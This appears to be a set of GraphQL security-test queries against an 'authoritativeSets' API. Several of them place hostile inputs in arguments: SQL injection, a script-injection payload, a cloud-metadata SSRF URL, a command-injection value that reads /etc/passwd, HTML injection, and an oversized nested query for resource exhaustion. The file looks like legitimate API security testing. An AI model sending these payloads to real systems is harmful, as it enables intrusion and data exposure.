query.query:
query {
  authoritativeSets(first: 5) {
    items {
      id
      name
      itemCount
    }
  }
}

query {
  authoritativeSets(from: "1' UNION SELECT * FROM users--") {
    items {
      identifier
      description
    }
  }
}

query {
  authoritativeSets(from: "<script>alert(document.domain)</script>") {
    items {
      name
      links {
        description
      }
    }
  }
}

query {
  authoritativeSets(after: "http://169.254.169.254/latest/meta-data") {
    items {
      authorities {
        items {
          descriptions {
            source
          }
        }
      }
    }
  }
}

query {
  authoritativeSets(from: "'; cat /etc/passwd #") {
    items {
      systemEvents {
        logMessage
      }
    }
  }
}

query {
  authoritativeSets(from: "<h1>Unauthorized Access</h1>") {
    items {
      annotations {
        body
      }
    }
  }
}

query {
  authoritativeSets(first: 10000) {
    items {
      id
      authorities {
        items {
          related {
            item {
              ... on HistoricalAgent {
                descriptions {
                  legalStatus
                }
              }
            }
          }
        }
      }
    }
  }
}

query {
  s: authoritativeSets(first: 100) {
    items { id }
  }
  s2: authoritativeSets(after: "cursor_v1") {
    items { name }
  }
}

query {
  authoritativeSets {
    queryType { name }
    mutationType { name }
    types {
      name
      fields {
        name
        type {
          name
          kind
        }
      }
    }
  }
}

query {
  authoritativeSets {
    itams {  # Intentional typo
      id
    }
  }
}
